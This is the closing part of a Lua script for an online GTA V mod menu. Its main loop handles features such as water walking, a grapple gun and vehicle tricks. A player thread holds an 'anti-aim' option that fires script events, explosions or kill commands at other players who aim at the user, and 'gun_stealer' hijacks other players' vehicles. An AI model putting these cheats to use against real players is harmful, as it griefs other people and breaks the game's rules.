            local healthbarsecondary = {r = colour_map.healthbar.r/2, g = colour_map.healthbar.g/2, b = colour_map.healthbar.b/2, a = colour_map.healthbar.a}

            draw_rect(mapx + padding/aspectratio, playerlisty + guih - padding, totalmapwidth/22, -((guih - padding * 3)/2 * healthperc), colour_map.healthbar) --foreground
            draw_rect(mapx + padding/aspectratio, playerlisty + guih/2 + padding/2, totalmapwidth/22, (guih - padding * 3)/2 * (1 - healthperc), healthbarsecondary) --background
        end
    end

    player_cur_car = entities.get_user_vehicle_as_handle()
    if last_car ~= player_cur_car and player_cur_car ~= 0 then 
        on_user_change_vehicle(player_cur_car)
        last_car = player_cur_car
    end

    if renderscorched then
        if player_cur_car ~= 0 then
            ENTITY.SET_ENTITY_RENDER_SCORCHED(player_cur_car, true)
        end
    end

    if mph_plate then
        if player_cur_car ~= 0 then
            if mph_unit == "KPH" then
                unit_conv = 3.6
            else
                unit_conv = 2.236936
            end
            speed = math.ceil(ENTITY.GET_ENTITY_SPEED(player_cur_car)*unit_conv)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(player_cur_car, speed .. " " .. mph_unit)
        end
    end

    if walkonwater or driveonwater or driveonair then
        if dow_block == 0 or not ENTITY.DOES_ENTITY_EXIST(dow_block) then
            local hash = util.joaat("stt_prop_stunt_bblock_mdm3")
            request_model_load(hash)
            local c = {}
            c.x = 0.0
            c.y = 0.0
            c.z = 0.0
            dow_block = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, c['x'], c['y'], c['z'], true, false, false)
            ENTITY.SET_ENTITY_ALPHA(dow_block, 0)
            ENTITY.SET_ENTITY_VISIBLE(dow_block, false, 0)
        end
    end

    if dow_block ~= 0 and not walkonwater and not walkonair and not driveonwater and not driveonair then
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
    end

    if walkonwater then
        vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 2.0, 0.0)
        -- we need to offset this because otherwise the player keeps diving off the thing, like a fucking dumbass
        -- ht isnt actually used here, but im allocating some memory anyways to prevent a possible crash, probably. idk im no computer engineer
        local ht = memory.alloc(4)
        -- this is better than ENTITY.IS_ENTITY_IN_WATER because it can detect if a player is actually above water without them even being "in" it
        if WATER.GET_WATER_HEIGHT(pos['x'], pos['y'], pos['z'], ht) then
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], memory.read_float(ht), false, false, false)
            ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        end
    end

    if driveonwater then
        if player_cur_car ~= 0 then
            local pos = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
            -- ht isnt actually used here, but im allocating some memory anyways to prevent a possible crash, probably. idk im no computer engineer
            local ht = memory.alloc(4)
            -- this is better than ENTITY.IS_ENTITY_IN_WATER because it can detect if a player is actually above water without them even being "in" it
            if WATER.GET_WATER_HEIGHT(pos['x'], pos['y'], pos['z'], ht) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], memory.read_float(ht), false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(player_cur_car))
            end
        else
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
        end
    end

    if driveonair then
        if player_cur_car ~= 0 then
            local pos = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
            local boxpos = ENTITY.GET_ENTITY_COORDS(dow_block, true)
            if MISC.GET_DISTANCE_BETWEEN_COORDS(pos['x'], pos['y'], pos['z'], boxpos['x'], boxpos['y'], boxpos['z'], true) >= 5 then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(player_cur_car))
            end
            if PAD.IS_CONTROL_PRESSED(22, 22) then
                doa_ht = doa_ht + 0.1
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
            end
            if PAD.IS_CONTROL_PRESSED(36, 36) then
                doa_ht = doa_ht - 0.1
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
            end
        end
    end

    if aim_info then
        local info = get_aim_info()
        if info['ent'] ~= 0 then
            local text = "哈希: " .. info['hash'] .. "\n实体: " .. info['ent'] .. "\n生命值: " .. info['health'] .. "\n类型: " .. info['type'] .. "\n速度: " .. info['speed']
            directx.draw_text(0.5, 0.3, text, 5, 0.5, to_rgb(1.0,1.0,1.0,1.0), true)
        end
    end

    if grapplegun then
        local curwep = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
        if PED.IS_PED_SHOOTING(players.user_ped()) and PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) then
            if curwep == util.joaat("weapon_pistol") or curwep == util.joaat("weapon_pistol_mk2") then
                local raycast_coord = raycast_gameplay_cam_gun(-1, 10000.0)
                if raycast_coord[1] == 1 then
                    local lastdist = nil
                    TASK.TASK_SKY_DIVE(players.user_ped())
                    while true do
                        if PAD.IS_CONTROL_JUST_PRESSED(45, 45) then 
                            break
                        end
                        if raycast_coord[4] ~= 0 and ENTITY.GET_ENTITY_TYPE(raycast_coord[4]) >= 1 and ENTITY.GET_ENTITY_TYPE(raycast_coord[4]) < 3 then
                            ggc1 = ENTITY.GET_ENTITY_COORDS(raycast_coord[4], true)
                        else
                            ggc1 = raycast_coord[2]
                        end
                        local c2 = players.get_position(players.user())
                        local dist = MISC.GET_DISTANCE_BETWEEN_COORDS(ggc1['x'], ggc1['y'], ggc1['z'], c2['x'], c2['y'], c2['z'], true)
                        -- safety
                        if not lastdist or dist < lastdist then 
                            lastdist = dist
                        else
                            break
                        end
                        if ENTITY.IS_ENTITY_DEAD(players.user_ped()) then
                            break
                        end
                        if dist >= 10 then
                            local dir = {}
                            dir['x'] = (ggc1['x'] - c2['x']) * dist
                            dir['y'] = (ggc1['y'] - c2['y']) * dist
                            dir['z'] = (ggc1['z'] - c2['z']) * dist
                            --ENTITY.APPLY_FORCE_TO_ENTITY(players.user_ped(), 2, dir['x'], dir['y'], dir['z'], 0.0, 0.0, 0.0, 0, false, false, true, false, true)
                            ENTITY.SET_ENTITY_VELOCITY(players.user_ped(), dir['x'], dir['y'], dir['z'])
                        else
                            local t = ENTITY.GET_ENTITY_TYPE(raycast_coord[4])
                            if t == 2 then
                                set_player_into_suitable_seat(raycast_coord[4])
                            elseif t == 1 then
                                local v = PED.GET_VEHICLE_PED_IS_IN(t, false)
                                if v ~= 0 then
                                    set_player_into_suitable_seat(v)
                                end
                            end
                            break
                        end
                        util.yield()
                    end
                end
            end
        end
    end

    if paintball then
        local ent = get_aim_info()['ent']
        request_control_of_entity(ent)
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            if ENTITY.IS_ENTITY_A_VEHICLE(ent) then
                rand = {}
                rand['r'] = math.random(100,255)
                rand['g'] = math.random(100,255)
                rand['b'] = math.random(100,255)
                VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(ent, rand['r'], rand['g'], rand['b'])
                VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(ent, rand['r'], rand['g'], rand['b'])
            end
        end
    end

    if driveonair then
        if player_cur_car ~= 0 then
            local pos = ENTITY.GET_ENTITY_COORDS(player_cur_car, true)
            local boxpos = ENTITY.GET_ENTITY_COORDS(dow_block, true)
            if MISC.GET_DISTANCE_BETWEEN_COORDS(pos['x'], pos['y'], pos['z'], boxpos['x'], boxpos['y'], boxpos['z'], true) >= 5 then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
                ENTITY.SET_ENTITY_HEADING(dow_block, ENTITY.GET_ENTITY_HEADING(player_cur_car))
            end
            if PAD.IS_CONTROL_PRESSED(22, 22) then
                doa_ht = doa_ht + 0.1
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
            end
            if PAD.IS_CONTROL_PRESSED(36, 36) then
                doa_ht = doa_ht - 0.1
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, pos['x'], pos['y'], doa_ht, false, false, false)
            end
        end
    end

    if gun_stealer then
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local ent = get_aim_info()['ent']
            if ENTITY.IS_ENTITY_A_VEHICLE(ent) then
                local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
                if PED.IS_PED_A_PLAYER(driver) then
                    hijack_veh_for_player(ent)
                end
                request_control_of_entity(ent)
                set_player_into_suitable_seat(ent)
            end
        end
    end

    if drivergun then
        local ent = get_aim_info()['ent']
        request_control_of_entity(ent)
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            if ENTITY.IS_ENTITY_A_VEHICLE(ent) then
                local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
                if driver == 0 or not PED.IS_PED_A_PLAYER(driver) then
                    if not PED.IS_PED_A_PLAYER(driver) then
                        entities.delete_by_handle(driver)
                    end
                    local hash = 0x9C9EFFD8
                    request_model_load(hash)
                    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, -2.0, 0.0, 0.0)
                    local ped = entities.create_ped(28, hash, coords, 30.0)
                    PED.SET_PED_INTO_VEHICLE(ped, ent, -1)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
                    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
                    PED.SET_PED_CAN_BE_DRAGGED_OUT(ped, false)
                    PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(ped, false)
                    TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped, ent, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(ent), 4, 5, 0)
                end
            end
        end
    end

    if tesla_ped ~= 0 then
        lastcar = PLAYER.GET_PLAYERS_LAST_VEHICLE()
        p_coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        t_coords = ENTITY.GET_ENTITY_COORDS(lastcar, true)
        dist = MISC.GET_DISTANCE_BETWEEN_COORDS(p_coords['x'], p_coords['y'], p_coords['z'], t_coords['x'], t_coords['y'], t_coords['z'], false)
        if lastcar == 0 or ENTITY.GET_ENTITY_HEALTH(lastcar) == 0 or dist <= 5 then
            entities.delete_by_handle(tesla_ped)
            VEHICLE.BRING_VEHICLE_TO_HALT(lastcar, 5.0, 2, true)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(lastcar, false)
            VEHICLE.START_VEHICLE_HORN(lastcar, 1000, util.joaat("NORMAL"), false)
            tesla_ped = 0
            util.remove_blip(tesla_blip)
        end
    end
    GuidedMissile.mainLoop()
    UFO.mainLoop()
    OrbitalCannon.mainLoop()
    bodyguardMenu:onTick()
    util.yield()
end

players_thread = util.create_thread(function (thr)
    while true do
        if player_uses > 0 then
            if show_updates then
                notify("Player pool is being updated")
            end
            all_players = players.list(true, true, true)
            for k,pid in pairs(all_players) do
                if anti_aim then 
                    local c1 = players.get_position(pid)
                    local c2 =  players.get_position(players.user())
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    if PED.IS_PED_FACING_PED(ped, players.user_ped(), anti_aim_angle) 
                        and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ped, players.user_ped(), 17)
                            and MISC.GET_DISTANCE_BETWEEN_COORDS(c1.x, c1.y, c1.z, c2.x, c2.y, c2.z) < 1000 
                                and WEAPON.GET_SELECTED_PED_WEAPON(ped) ~= -1569615261 
                                    and PED.GET_PED_CONFIG_FLAG(ped, 78, true) then
                        pluto_switch anti_aim_type do 
                            case 1: 
                                util.trigger_script_event(1 << pid, {-1388926377, 4, -1762807505, 0})
                                break
                            case 2: 
                                local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0.0, 0.0, 2.8)
                                FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 70, 100.0, false, true, 0.0)
                                break
                            case 3:
                                menu.trigger_commands("kill " .. players.get_name(pid))
                                break
                        end
                        if anti_aim_notify then
                            notify(players.get_name(pid) .. translations.is_aiming_at_you)
                        end
                    end
                end
            end
        end
        util.yield()
    end
end)

util.on_stop(function()
    if ENTITY.DOES_ENTITY_EXIST(selfSpeechPed.entity) then
        entities.delete(selfSpeechPed.entity)
    end
    ANIMATIONS = {}
    if animLoaded then
        util.toast("警告:卸载动画浏览列表，将会卡顿.")
        destroy_animations_data()
    end
    delete_anim_props()
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    if not PED.IS_PED_IN_ANY_VEHICLE(my_ped) then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(my_ped)
    end
end)

while true do
    if selfSpeechPed.entity > 0 and os.millis() - selfSpeechPed.lastUsed > 20 then
        if ENTITY.DOES_ENTITY_EXIST(selfSpeechPed.entity) then
            entities.delete(selfSpeechPed.entity)
        end
        selfSpeechPed.entity = 0
    end
	util.yield()
end

while true do
    if NETWORK.NETWORK_IS_IN_SESSION() == false then
        while NETWORK.NETWORK_IS_IN_SESSION() == false or util.is_session_transition_active() do
            util.yield(1000)
        end
        util.yield(1000)
		spawnpos = players.get_position(players.user())
        repeat
            local pos = players.get_position(players.user())
            util.yield(500)
        until spawnpos.x ~= pos.x and spawnpos.y ~= pos.y
        if do_autoload then
            load_loadout:trigger()
        else
            regen_menu()
        end
    end
    util.yield(100)
end
